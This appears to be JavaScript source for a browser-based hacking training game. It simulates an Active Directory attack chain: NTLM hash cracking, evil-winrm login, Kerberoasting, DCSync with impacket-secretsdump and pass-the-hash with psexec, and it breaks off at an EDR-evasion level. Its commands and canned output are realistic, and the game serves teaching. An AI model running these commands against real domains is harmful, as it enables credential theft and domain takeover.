      print('║  # TODO: Remove this file! - IT Admin                      ║', 'warning');
      print('║                                                            ║', 'info');
      print('║  svc_backup:1001:aad3b435b51404eeaad3b435b51404ee:         ║', 'system');
      print('║    58a478135a93ac3bf058a5ea0e8fdb71:::                     ║', 'success');
      print('╚════════════════════════════════════════════════════════════╝', 'info');
      print('', '');
      print('[!] NTLM hash captured!', 'success');
      print('[*] Format: username:uid:lm_hash:ntlm_hash', 'system');
      print('[*] Use hashcat -m 1000 to crack the NTLM hash', 'info');
      print('', '');
      playAlert();
      state.gotHash = true;
      autosave();
      return;
    }

    print('File not found: ' + (args[0] || 'no filename specified'), 'error');
    return;
  }

  if (cmd === 'hashcat') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('hashcat v6.2.6 - advanced password recovery', 'info');
      print('', '');
      print('Usage: hashcat [options]... hash|hashfile [dictionary|mask|directory]...', 'system');
      print('', '');
      print('OPTIONS:', 'warning');
      print('  -m, --hash-type <num>       Hash-type (see below)', 'success');
      print('  -a, --attack-mode <num>     Attack-mode (0=straight, 3=brute)', 'system');
      print('  -o, --outfile <file>        Output file', 'system');
      print('  --show                      Show cracked passwords', 'system');
      print('', '');
      print('COMMON HASH MODES:', 'warning');
      print('    0 | MD5', 'system');
      print('  100 | SHA1', 'system');
      print(' 1000 | NTLM (Windows)', 'success');
      print(' 3200 | bcrypt', 'system');
      print(' 5600 | NetNTLMv2', 'system');
      print('13100 | Kerberos 5 TGS-REP (Kerberoast)', 'success');
      print('18200 | Kerberos 5 AS-REP (AS-REP roast)', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  hashcat -m 1000 hash.txt rockyou.txt', 'system');
      print('  hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a', 'system');
      print('', '');
      return;
    }

    if (!state.gotHash) {
      print('Need a hash to crack first', 'warning');
      return;
    }

    // Validate -m flag
    if (!args.includes('-m')) {
      print('hashcat: Hash-type required (-m)', 'error');
      print('Usage: hashcat -m <mode> <hash_file> <wordlist>', 'system');
      print('', '');
      print('For NTLM: hashcat -m 1000 hash.txt rockyou.txt', 'info');
      return;
    }

    const mIdx = args.indexOf('-m');
    const mode = args[mIdx + 1];

    if (mode !== '1000') {
      print(`hashcat: starting hash-mode ${mode}...`, 'system');
      await simulateLoading('Analyzing hash', 1500);
      print('Hashfile format: NTLM hash detected', 'info');
      print(`Hash-mode ${mode} doesn't match the hash type`, 'error');
      print('', '');
      print('[!] This is an NTLM hash. Use: hashcat -m 1000', 'warning');
      return;
    }

    // Check for wordlist
    const hasWordlist = args.some(a => a.includes('.txt') || a.includes('rockyou'));
    if (!hasWordlist) {
      print('hashcat: No wordlist specified', 'error');
      print('Usage: hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt', 'system');
      return;
    }

    await simulateLoading('Cracking NTLM hash', 4000);
    print('', '');
    print('hashcat (v6.2.6) starting...', 'info');
    print('', '');
    print('58a478135a93ac3bf058a5ea0e8fdb71:Backup2023!', 'success');
    print('', '');
    print('Session..........: hashcat', 'system');
    print('Status...........: Cracked', 'success');
    print('Hash.Mode........: 1000 (NTLM)', 'system');
    print('Hash.Target......: 58a478135a93ac3bf058a5ea0e8fdb71', 'system');
    print('Recovered........: 1/1 (100.00%) Digests', 'success');
    print('', '');
    print('[+] Cracked: svc_backup:Backup2023!', 'success');
    print('[*] Use these creds with evil-winrm', 'info');
    playSuccess();
    state.crackedHash = true;
    autosave();
    return;
  }

  if (cmd === 'evil-winrm') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('Evil-WinRM v3.5 - Windows Remote Management Shell', 'info');
      print('', '');
      print('Usage: evil-winrm -i IP -u USER [-p PASS] [-H HASH] [options]', 'system');
      print('', '');
      print('REQUIRED:', 'warning');
      print('  -i, --ip IP              Remote host IP or hostname', 'success');
      print('  -u, --user USER          Username', 'success');
      print('', '');
      print('AUTHENTICATION:', 'info');
      print('  -p, --password PASS      Password', 'system');
      print('  -H, --hash HASH          NTLM hash (Pass-the-Hash)', 'system');
      print('  -k, --kerberos           Use Kerberos authentication', 'system');
      print('', '');
      print('OPTIONS:', 'info');
      print('  -s, --scripts PATH       Powershell scripts path', 'system');
      print('  -e, --executables PATH   C# executables path', 'system');
      print('  -P, --port PORT          Remote WinRM port (default: 5985)', 'system');
      print('  -S, --ssl                Use SSL (port 5986)', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  evil-winrm -i 10.10.10.100 -u svc_backup -p Backup2023!', 'success');
      print('  evil-winrm -i 10.10.10.100 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash', 'system');
      print('', '');
      return;
    }

    if (!state.crackedHash) {
      print('Need valid credentials (crack the hash first)', 'error');
      return;
    }

    // Validate required flags
    if (!args.includes('-i')) {
      print('Error: Target IP required (-i)', 'error');
      print('Usage: evil-winrm -i <ip> -u <user> -p <password>', 'system');
      return;
    }

    if (!args.includes('-u')) {
      print('Error: Username required (-u)', 'error');
      print('Usage: evil-winrm -i <ip> -u <user> -p <password>', 'system');
      return;
    }

    if (!args.includes('-p') && !args.includes('-H')) {
      print('Error: Password (-p) or hash (-H) required', 'error');
      print('Usage: evil-winrm -i <ip> -u <user> -p <password>', 'system');
      return;
    }

    // Get values
    const ipIdx = args.indexOf('-i');
    const ip = args[ipIdx + 1];
    const userIdx = args.indexOf('-u');
    const user = args[userIdx + 1];

    let pass = null;
    if (args.includes('-p')) {
      const passIdx = args.indexOf('-p');
      pass = args[passIdx + 1];
    }

    // Validate credentials
    if (ip !== '10.10.10.100') {
      await simulateLoading('Connecting to ' + ip, 1500);
      print('Error: WinRM service not available on ' + ip, 'error');
      print('[*] Try the Domain Controller: 10.10.10.100', 'info');
      return;
    }

    if (user !== 'svc_backup') {
      await simulateLoading('Authenticating', 1500);
      print('Error: Authentication failed - invalid username', 'error');
      return;
    }

    if (pass !== 'Backup2023!') {
      await simulateLoading('Authenticating', 1500);
      print('Error: Authentication failed - invalid password', 'error');
      print('[*] Did you crack the hash correctly?', 'info');
      return;
    }

    await simulateLoading('Connecting to CORP-DC01', 2000);
    print('', '');
    print('Evil-WinRM shell v3.5', 'success');
    print('', '');
    print('Warning: Remote path completions is disabled due to ruby/telecom version', 'muted');
    print('', '');
    print('Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion', 'muted');
    print('', '');
    print('Info: Establishing connection to remote endpoint', 'info');
    print('', '');
    print('*Evil-WinRM* PS C:\\Users\\svc_backup\\Desktop> ', 'success');
    print('', '');
    print('[+] Connected as CORP\\svc_backup!', 'success');
    print('[*] Type "whoami" to verify access and complete the level', 'info');
    prompt.textContent = '*Evil-WinRM* PS>';
    state.authenticated = true;
    autosave();
    return;
  }

  if (cmd === 'whoami' && state.authenticated) {
    print('megacorp\\svc_backup', 'success');
    print('');
    completeLevel();
    return;
  }

  if (cmd === 'ls' && state.authenticated) {
    print('    Directory: C:\\Users\\svc_backup\\Desktop', 'system');
    print('Mode                 LastWriteTime         Length Name', 'system');
    print('----                 -------------         ------ ----', 'system');
    print('-a----         1/15/2024   9:00 AM             38 flag.txt', 'system');
    return;
  }

  if (cmd === 'cat' && state.authenticated && args[0] === 'flag.txt') {
    print('FLAG{l4t3r4l_m0v3m3nt_m4st3r}', 'success');
    completeLevel();
    return;
  }

  print('Command not found: ' + cmd, 'error');
}

// ============================================
// LEVEL 3: ELITE HACKER
// ============================================
async function initLevel3() {
  gameState.levelState = {
    collectedBloodhound: false,
    foundPath: false,
    kerberoasted: false,
    crackedTicket: false,
    gotDA: false
  };

  print('┌─────────────────────────────────────────┐', 'info');
  print('│  TARGET INTEL                           │', 'info');
  print('├─────────────────────────────────────────┤', 'info');
  print('│  Domain:   MEGACORP.LOCAL               │', 'system');
  print('│  DC:       CORP-DC01 (10.10.10.100)     │', 'system');
  print('│  OS:       Windows Server 2019          │', 'system');
  print('│  Foothold: svc_backup (service acct)    │', 'success');
  print('│  Intel:    Kerberoastable SPNs found    │', 'warning');
  print('├─────────────────────────────────────────┤', 'info');
  print('│  KEY ACCOUNTS:                          │', 'info');
  print('│    Administrator  - Domain Admin        │', 'error');
  print('│    svc_sql        - SQL Service (SPN)   │', 'warning');
  print('│    backup_svc     - Backup Service      │', 'system');
  print('└─────────────────────────────────────────┘', 'info');
  print('');
  print('Current session: MEGACORP\\svc_backup', 'success');
  print('');
  print('[BRIEFING] Full Active Directory engagement.', 'info');
  print('[BRIEFING] You have a foothold. Now escalate to DA.', 'info');
  print('');
}

async function handleLevel3Command(cmd, args) {
  const state = gameState.levelState;

  if (cmd === 'help') {
    print('', '');
    print('╔════════════════════════════════════════════════════════════════╗', 'info');
    print('║                    LEVEL 3 COMMANDS                            ║', 'info');
    print('╠════════════════════════════════════════════════════════════════╣', 'info');
    print('║  RECONNAISSANCE:                                               ║', 'info');
    print('║    bloodhound-python -d <domain> -u <user> -p <pass> -c all   ║', 'system');
    print('║    bloodhound           Analyze collected AD data             ║', 'system');
    print('║                                                                ║', 'info');
    print('║  KERBEROS ATTACKS:                                             ║', 'info');
    print('║    rubeus kerberoast    Request TGS for SPNs (offline crack)  ║', 'system');
    print('║    hashcat -m 13100     Crack Kerberos TGS ticket             ║', 'system');
    print('║                                                                ║', 'info');
    print('║  CREDENTIAL DUMPING:                                           ║', 'info');
    print('║    impacket-secretsdump  Dump domain secrets (needs privs)    ║', 'system');
    print('║                                                                ║', 'info');
    print('║  LATERAL MOVEMENT:                                             ║', 'info');
    print('║    impacket-psexec      Get shell via SMB (pass-the-hash)     ║', 'system');
    print('║                                                                ║', 'info');
    print('║  UTILITY:                                                      ║', 'info');
    print('║    status               Show current progress                 ║', 'success');
    print('║    hint                 Get a hint if stuck                   ║', 'warning');
    print('║    exit                 Return to main menu                   ║', 'system');
    print('╚════════════════════════════════════════════════════════════════╝', 'info');
    print('', '');
    print('TIP: Use TAB for autocomplete, ↑/↓ for command history', 'system');
    return;
  }

  if (cmd === 'status') {
    print('', '');
    print('┌─────────────────────────────────────┐', 'info');
    print('│      LEVEL 3 PROGRESS STATUS        │', 'info');
    print('├─────────────────────────────────────┤', 'info');
    print(`│  [${state.collectedBloodhound ? 'x' : ' '}] AD data collected            │`, state.collectedBloodhound ? 'success' : 'system');
    print(`│  [${state.foundPath ? 'x' : ' '}] Attack path identified        │`, state.foundPath ? 'success' : 'system');
    print(`│  [${state.kerberoasted ? 'x' : ' '}] Kerberoast completed          │`, state.kerberoasted ? 'success' : 'system');
    print(`│  [${state.crackedTicket ? 'x' : ' '}] TGS ticket cracked            │`, state.crackedTicket ? 'success' : 'system');
    print(`│  [${state.gotDA ? 'x' : ' '}] Domain Admin achieved         │`, state.gotDA ? 'success' : 'system');
    print('└─────────────────────────────────────┘', 'info');
    print('', '');
    return;
  }

  if (cmd === 'hint') {
    print('', '');
    print('[*] HINT:', 'warning');
    if (!state.collectedBloodhound) {
      print('Start by collecting Active Directory data for analysis.', 'info');
      print('Try: bloodhound-python -d MEGACORP.LOCAL -u svc_backup -p Backup2023! -c all', 'success');
    } else if (!state.foundPath) {
      print('Analyze the collected data to find attack paths to Domain Admin.', 'info');
      print('Try: bloodhound', 'success');
    } else if (!state.kerberoasted) {
      print('svc_sql has an SPN - request its Kerberos ticket!', 'info');
      print('Try: rubeus kerberoast', 'success');
    } else if (!state.crackedTicket) {
      print('Crack the TGS ticket offline with hashcat mode 13100.', 'info');
      print('Try: hashcat -m 13100 ticket.txt', 'success');
    } else if (!state.gotDA) {
      print('Use the GenericAll privilege to dump domain secrets!', 'info');
      print('Try: impacket-secretsdump then impacket-psexec', 'success');
    } else {
      print('Level complete! You are Domain Admin!', 'success');
    }
    print('', '');
    return;
  }

  // Easter egg: net user
  if (cmd === 'net' && args[0] === 'user') {
    print('User accounts for \\\\MEGACORP-DC', 'system');
    print('', 'system');
    print('Administrator     backup_svc        Guest', 'system');
    print('krbtgt            svc_sql           j.smith', 'system');
    print('', 'system');
    print('The command completed successfully.', 'system');
    addEasterEgg('lvl3_netuser', 'Old school recon! BloodHound is faster though.');
    return;
  }

  if (cmd === 'bloodhound-python') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('bloodhound-python - Active Directory BloodHound Ingestor', 'info');
      print('', '');
      print('Usage: bloodhound-python -d <domain> -u <user> -p <pass> [options]', 'system');
      print('', '');
      print('REQUIRED:', 'warning');
      print('  -d, --domain DOMAIN      Target domain name', 'success');
      print('  -u, --user USER          Domain username', 'success');
      print('  -p, --password PASS      Domain password', 'success');
      print('', '');
      print('COLLECTION OPTIONS:', 'info');
      print('  -c, --collection METHOD  Collection method:', 'system');
      print('      all      - All collection methods (recommended)', 'success');
      print('      default  - Default collection', 'system');
      print('      group    - Group membership', 'system');
      print('      session  - Session information', 'system');
      print('      acl      - ACL information', 'system');
      print('      trusts   - Domain trusts', 'system');
      print('', '');
      print('OUTPUT OPTIONS:', 'info');
      print('  --zip                    Compress output to zip', 'system');
      print('  -o, --output DIR         Output directory', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  bloodhound-python -d MEGACORP.LOCAL -u svc_backup -p Backup2023! -c all', 'success');
      print('  bloodhound-python -d corp.local -u user -p pass --zip', 'system');
      print('', '');
      return;
    }

    // Validate required flags
    if (!args.includes('-d') && !args.includes('--domain')) {
      print('Error: Domain required (-d)', 'error');
      print('Usage: bloodhound-python -d <domain> -u <user> -p <pass> -c all', 'system');
      return;
    }

    if (!args.includes('-u') && !args.includes('--user')) {
      print('Error: Username required (-u)', 'error');
      print('Usage: bloodhound-python -d <domain> -u <user> -p <pass> -c all', 'system');
      return;
    }

    if (!args.includes('-p') && !args.includes('--password')) {
      print('Error: Password required (-p)', 'error');
      print('Usage: bloodhound-python -d <domain> -u <user> -p <pass> -c all', 'system');
      return;
    }

    if (!args.includes('-c') && !args.includes('--collection')) {
      print('Warning: No collection method specified, using default', 'warning');
      print('Tip: Use -c all for comprehensive collection', 'info');
    }

    await simulateLoading('Collecting Active Directory data', 4000);
    print('', '');
    print('INFO: Found AD domain: MEGACORP.LOCAL', 'info');
    print('INFO: Connecting to LDAP server: CORP-DC01.megacorp.local', 'system');
    print('INFO: Found 1 domain(s)', 'system');
    print('INFO: Found 1 forest(s)', 'system');
    print('INFO: Enumerating users', 'system');
    print('INFO: Found 245 users', 'system');
    print('INFO: Enumerating groups', 'system');
    print('INFO: Found 52 groups', 'system');
    print('INFO: Enumerating computers', 'system');
    print('INFO: Found 12 computers', 'system');
    print('INFO: Enumerating GPOs', 'system');
    print('INFO: Found 3 GPOs', 'system');
    print('INFO: Enumerating OUs', 'system');
    print('INFO: Found 8 OUs', 'system');
    print('INFO: Collecting ACLs', 'system');
    print('INFO: Done in 00:00:14', 'success');
    print('', '');
    print('[+] Data written to:', 'success');
    print('    20240115_bloodhound/computers.json', 'system');
    print('    20240115_bloodhound/users.json', 'system');
    print('    20240115_bloodhound/groups.json', 'system');
    print('    20240115_bloodhound/domains.json', 'system');
    print('', '');
    print('[*] Import these into BloodHound GUI for analysis', 'info');
    print('[*] Or run "bloodhound" to view attack paths', 'info');
    state.collectedBloodhound = true;
    autosave();
    return;
  }

  if (cmd === 'bloodhound') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('BloodHound - Active Directory Attack Path Analyzer', 'info');
      print('', '');
      print('Usage: bloodhound [command]', 'system');
      print('', '');
      print('COMMANDS:', 'warning');
      print('  (no args)       Analyze collected data and show attack paths', 'system');
      print('  paths           Show all discovered attack paths', 'system');
      print('  kerberoastable  List Kerberoastable users', 'system');
      print('  asrep           List AS-REP roastable users', 'system');
      print('  highvalue       Show high-value targets', 'system');
      print('', '');
      return;
    }

    if (!state.collectedBloodhound) {
      print('Error: No data collected', 'warning');
      print('Run bloodhound-python first to collect AD data', 'info');
      print('', '');
      print('Example: bloodhound-python -d MEGACORP.LOCAL -u svc_backup -p Backup2023! -c all', 'system');
      return;
    }

    print('', '');
    print('╔══════════════════════════════════════════════════════════════════╗', 'info');
    print('║              BLOODHOUND - ATTACK PATH ANALYSIS                   ║', 'info');
    print('╚══════════════════════════════════════════════════════════════════╝', 'info');
    print('', '');
    print('=== SHORTEST PATH TO DOMAIN ADMIN ===', 'success');
    print('', '');
    print('┌────────────────┐', 'info');
    print('│  svc_backup    │  ← You are here', 'success');
    print('│  (Service)     │', 'system');
    print('└───────┬────────┘', 'info');
    print('        │', 'system');
    print('        │ [CanPSRemote]', 'warning');
    print('        ▼', 'system');
    print('┌────────────────┐', 'info');
    print('│  svc_sql       │  ← Kerberoastable SPN!', 'warning');
    print('│  (SQL Service) │', 'system');
    print('└───────┬────────┘', 'info');
    print('        │', 'system');
    print('        │ [MemberOf]', 'warning');
    print('        ▼', 'system');
    print('┌────────────────┐', 'info');
    print('│  SQL_Admins    │  ← High privilege group', 'info');
    print('│  (Group)       │', 'system');
    print('└───────┬────────┘', 'info');
    print('        │', 'system');
    print('        │ [GenericAll]', 'error');
    print('        ▼', 'system');
    print('┌────────────────┐', 'success');
    print('│ DOMAIN ADMINS  │  ← TARGET', 'success');
    print('│  (Group)       │', 'system');
    print('└────────────────┘', 'success');
    print('', '');
    print('[!] ATTACK CHAIN IDENTIFIED:', 'warning');
    print('    1. Kerberoast svc_sql (has MSSQLSvc SPN)', 'system');
    print('    2. Crack the TGS ticket offline', 'system');
    print('    3. Use svc_sql creds - member of SQL_Admins', 'system');
    print('    4. SQL_Admins has GenericAll on Domain Admins', 'system');
    print('    5. Use GenericAll to DCSync or add user to DA', 'system');
    print('', '');
    print('[*] Next step: rubeus kerberoast /user:svc_sql', 'info');
    playAlert();
    state.foundPath = true;
    autosave();
    return;
  }

  if (cmd === 'rubeus') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h') || args.length === 0) {
      print('', '');
      print('Rubeus v2.2.0 - Kerberos Interaction Tool', 'info');
      print('', '');
      print('Usage: rubeus <command> [options]', 'system');
      print('', '');
      print('ROASTING ATTACKS:', 'warning');
      print('  kerberoast             Request TGS tickets for SPNs (offline crack)', 'success');
      print('  asreproast             AS-REP roast (no preauth required)', 'system');
      print('', '');
      print('TICKET OPERATIONS:', 'info');
      print('  tgtdeleg               Get a usable TGT for current user', 'system');
      print('  s4u                    Constrained delegation abuse (S4U2Self/S4U2Proxy)', 'success');
      print('  ptt                    Pass the ticket', 'system');
      print('  purge                  Purge tickets from memory', 'system');
      print('', '');
      print('KERBEROAST OPTIONS:', 'info');
      print('  /user:<user>           Target specific user', 'system');
      print('  /spn:<spn>             Target specific SPN', 'system');
      print('  /outfile:<file>        Output to file', 'system');
      print('  /format:hashcat        Output in hashcat format (default)', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  rubeus kerberoast', 'system');
      print('  rubeus kerberoast /user:svc_sql /outfile:ticket.txt', 'system');
      print('  rubeus asreproast /user:j.smith', 'system');
      print('  rubeus s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator', 'system');
      print('', '');
      return;
    }

    if (!state.foundPath) {
      print('Identify attack path first with BloodHound', 'warning');
      return;
    }

    if (args[0] === 'kerberoast') {
      // Check for target user (more realistic)
      const userArg = args.find(a => a.startsWith('/user:'));
      const user = userArg ? userArg.split(':')[1] : 'svc_sql';

      await simulateLoading('Performing Kerberoast attack', 3000);
      print('', '');
      print('[*] Action: Kerberoasting', 'info');
      print('[*] Using current credentials (svc_backup)', 'system');
      print('', '');
      print(`[*] Target User       : ${user}@MEGACORP.LOCAL`, 'system');
      print('[*] Target Service    : MSSQLSvc/SQL01.megacorp.local:1433', 'system');
      print('[*] Supported ETypes  : RC4_HMAC_DEFAULT', 'system');
      print('', '');
      print('[+] TGS ticket retrieved!', 'success');
      print('', '');
      print('$krb5tgs$23$*svc_sql$MEGACORP.LOCAL$MSSQLSvc/SQL01.megacorp.local:1433*$', 'success');
      print('a8f5e2d4c1b3e7f9d2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8', 'muted');
      print('e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2a4b6c8e0f2', 'muted');
      print('[...truncated...]', 'system');
      print('', '');
      print('[+] Ticket saved to: ticket.txt', 'success');
      print('[*] Crack with: hashcat -m 13100 ticket.txt rockyou.txt', 'info');
      state.kerberoasted = true;
      autosave();
      return;
    }

    if (args[0] === 'asreproast') {
      print('', '');
      print('[*] Action: AS-REP Roasting', 'info');
      print('[*] Searching for users without Kerberos preauth...', 'system');
      print('', '');
      print('[!] No AS-REP roastable users found', 'warning');
      print('[*] All users require Kerberos preauthentication', 'system');
      print('[*] Try Kerberoasting instead: rubeus kerberoast', 'info');
      return;
    }

    print('Unknown Rubeus command: ' + args[0], 'error');
    print('Try: rubeus --help', 'system');
    return;
  }

  if (cmd === 'hashcat') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('hashcat v6.2.6 - advanced password recovery', 'info');
      print('', '');
      print('COMMON HASH MODES FOR AD:', 'warning');
      print(' 1000  | NTLM', 'system');
      print(' 5600  | NetNTLMv2', 'system');
      print('13100  | Kerberos 5 TGS-REP etype 23 (Kerberoast)', 'success');
      print('18200  | Kerberos 5 AS-REP etype 23', 'system');
      print('19600  | Kerberos 5 TGS-REP etype 17 (AES128)', 'system');
      print('19700  | Kerberos 5 TGS-REP etype 18 (AES256)', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  hashcat -m 13100 ticket.txt rockyou.txt', 'success');
      print('  hashcat -m 1000 ntlm.txt rockyou.txt', 'system');
      print('', '');
      return;
    }

    if (!state.kerberoasted) {
      print('Need a ticket to crack', 'warning');
      print('Run: rubeus kerberoast', 'info');
      return;
    }

    // Validate -m flag
    if (!args.includes('-m')) {
      print('hashcat: Hash-type required (-m)', 'error');
      print('For Kerberoast: hashcat -m 13100 ticket.txt rockyou.txt', 'info');
      return;
    }

    const mIdx = args.indexOf('-m');
    const mode = args[mIdx + 1];

    if (mode !== '13100') {
      print(`hashcat: starting hash-mode ${mode}...`, 'system');
      await simulateLoading('Analyzing hash', 1500);
      print('Hash format: Kerberos TGS-REP detected', 'info');
      print(`Hash-mode ${mode} doesn't match`, 'error');
      print('', '');
      print('[!] This is a Kerberos TGS ticket. Use: hashcat -m 13100', 'warning');
      return;
    }

    await simulateLoading('Cracking Kerberos TGS ticket', 5000);
    print('', '');
    print('hashcat (v6.2.6) starting...', 'info');
    print('', '');
    print('$krb5tgs$23$*svc_sql$MEGACORP.LOCAL$...:SQLAdmin2023!', 'success');
    print('', '');
    print('Session..........: hashcat', 'system');
    print('Status...........: Cracked', 'success');
    print('Hash.Mode........: 13100 (Kerberos 5 TGS-REP etype 23)', 'system');
    print('Hash.Target......: $krb5tgs$23$*svc_sql$MEGACORP.LOCAL$...', 'system');
    print('Recovered........: 1/1 (100.00%) Digests', 'success');
    print('', '');
    print('[+] Password cracked: svc_sql:SQLAdmin2023!', 'success');
    print('[*] svc_sql is member of SQL_Admins which has GenericAll on DA!', 'warning');
    print('[*] Use impacket-secretsdump to DCSync', 'info');
    playSuccess();
    state.crackedTicket = true;
    autosave();
    return;
  }

  if (cmd === 'impacket-secretsdump' || cmd === 'secretsdump.py') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('Impacket secretsdump.py - Remote SAM/LSA/NTDS dumper', 'info');
      print('', '');
      print('Usage: impacket-secretsdump [domain/]user[:password]@target [options]', 'system');
      print('', '');
      print('AUTHENTICATION:', 'warning');
      print('  -hashes LM:NT          NTLM hashes (pass-the-hash)', 'system');
      print('  -no-pass               No password prompt', 'system');
      print('  -k                     Use Kerberos authentication', 'system');
      print('', '');
      print('DUMP OPTIONS:', 'info');
      print('  -just-dc              Only NTDS.dit data (DCSync)', 'success');
      print('  -just-dc-ntlm         Only NTDS.dit NTLM hashes', 'system');
      print('  -just-dc-user USER    Extract only specific user', 'system');
      print('  -sam                  Dump local SAM hashes', 'system');
      print('  -lsa                  Dump LSA secrets', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  impacket-secretsdump MEGACORP.LOCAL/svc_sql:SQLAdmin2023!@10.10.10.100', 'success');
      print('  impacket-secretsdump -hashes :HASH domain/user@dc -just-dc', 'system');
      print('', '');
      return;
    }

    if (!state.crackedTicket) {
      print('Need valid credentials first', 'warning');
      print('Crack the Kerberoast ticket with hashcat -m 13100', 'info');
      return;
    }

    // Validate argument format
    if (!args[0] || !args[0].includes('@')) {
      print('impacket-secretsdump: Invalid syntax', 'error');
      print('', '');
      print('Usage: impacket-secretsdump domain/user:pass@target', 'system');
      print('Example: impacket-secretsdump MEGACORP.LOCAL/svc_sql:SQLAdmin2023!@10.10.10.100', 'info');
      return;
    }

    await simulateLoading('Performing DCSync attack', 4000);
    print('', '');
    print('Impacket v0.11.0 - Copyright 2023 Fortra', 'info');
    print('', '');
    print('[*] Target system: CORP-DC01.megacorp.local (10.10.10.100)', 'system');
    print('[*] Using SQL_Admins GenericAll privilege for DCSync', 'warning');
    print('[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)', 'system');
    print('[*] Using the DRSUAPI method to get NTDS.DIT secrets', 'system');
    print('', '');
    print('Administrator:500:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::', 'success');
    print('Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', 'system');
    print('krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b21c99fc068e3ab2ca789bccbef67de4:::', 'warning');
    print('svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::', 'system');
    print('svc_sql:1105:aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f:::', 'system');
    print('CORP-DC01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', 'system');
    print('[*] Kerberos keys grabbed', 'system');
    print('', '');
    print('[+] DCSync successful! Got Domain Admin hash!', 'success');
    print('[*] Administrator NTLM: a87f3a337d73085c45f9416be5787d86', 'success');
    print('[*] Use this hash with impacket-psexec for shell', 'info');
    playAlert();
    state.gotDA = true;
    autosave();
    return;
  }

  if (cmd === 'impacket-psexec' || cmd === 'psexec.py') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('Impacket psexec.py - PSEXEC-like functionality via SMB', 'info');
      print('', '');
      print('Usage: impacket-psexec [domain/]user[:password]@target [options]', 'system');
      print('', '');
      print('AUTHENTICATION:', 'warning');
      print('  -hashes LM:NT          NTLM hashes (pass-the-hash)', 'success');
      print('  -no-pass               No password prompt', 'system');
      print('  -k                     Use Kerberos authentication', 'system');
      print('', '');
      print('OPTIONS:', 'info');
      print('  -service-name NAME     Service name to use', 'system');
      print('  -codec CODEC           Output codec', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  impacket-psexec domain/user:pass@target', 'system');
      print('  impacket-psexec -hashes :NTLM_HASH domain/Administrator@target', 'success');
      print('', '');
      return;
    }

    if (!state.gotDA) {
      print('Need Domain Admin credentials', 'warning');
      print('Run impacket-secretsdump first to get the Administrator hash', 'info');
      return;
    }

    // Validate argument format
    if (!args[0] || !args[0].includes('@')) {
      print('impacket-psexec: Invalid syntax', 'error');
      print('', '');
      print('Usage: impacket-psexec -hashes :HASH domain/Administrator@target', 'system');
      print('Example: impacket-psexec -hashes :a87f3a337d73085c45f9416be5787d86 MEGACORP.LOCAL/Administrator@10.10.10.100', 'info');
      return;
    }

    // Check for -hashes flag (pass-the-hash)
    if (!args.includes('-hashes')) {
      print('impacket-psexec: Authentication required', 'error');
      print('Use pass-the-hash: -hashes :NTLM_HASH', 'info');
      print('', '');
      print('Example: impacket-psexec -hashes :a87f3a337d73085c45f9416be5787d86 MEGACORP.LOCAL/Administrator@10.10.10.100', 'system');
      return;
    }

    await simulateLoading('Connecting as Administrator via PsExec', 2000);
    print('', '');
    print('Impacket v0.11.0 - Copyright 2023 Fortra', 'info');
    print('', '');
    print('[*] Requesting shares on 10.10.10.100...', 'system');
    print('[*] Found writable share ADMIN$', 'system');
    print('[*] Uploading file FjdSKLwE.exe', 'system');
    print('[*] Opening SVCManager on 10.10.10.100...', 'system');
    print('[*] Creating service wLKd on 10.10.10.100...', 'system');
    print('[*] Starting service wLKd...', 'system');
    print('[!] Press help for extra shell commands', 'muted');
    print('', '');
    print('Microsoft Windows [Version 10.0.17763.4377]', 'success');
    print('(c) 2019 Microsoft Corporation. All rights reserved.', 'system');
    print('', '');
    print('C:\\Windows\\system32> whoami', 'system');
    print('nt authority\\system', 'success');
    print('', '');
    print('C:\\Windows\\system32>', 'success');
    prompt.textContent = 'C:\\Windows\\system32>';
    print('', '');
    print(ASCII.crown, 'ascii');
    print('', '');
    print('╔══════════════════════════════════════════════════════════════════╗', 'success');
    print('║               *** DOMAIN ADMIN ACHIEVED! ***                        ║', 'success');
    print('╠══════════════════════════════════════════════════════════════════╣', 'success');
    print('║  Attack Chain: Kerberoast → Crack → GenericAll → DCSync → PtH   ║', 'info');
    print('╚══════════════════════════════════════════════════════════════════╝', 'success');
    completeLevel();
    return;
  }

  print('Command not found: ' + cmd, 'error');
}

// ============================================
// LEVEL 4: EDR EVADER
// ============================================
async function initLevel4() {
  gameState.levelState = {
    edrAnalyzed: false,
    ntdllUnhooked: false,
    payloadObfuscated: false,
    injectionReady: false,
    executed: false,
    detectionLevel: 100
  };

  print(ASCII.edr, 'warning');
  print('');
  print('┌─────────────────────────────────────────┐', 'info');
  print('│  TARGET INTEL                           │', 'info');
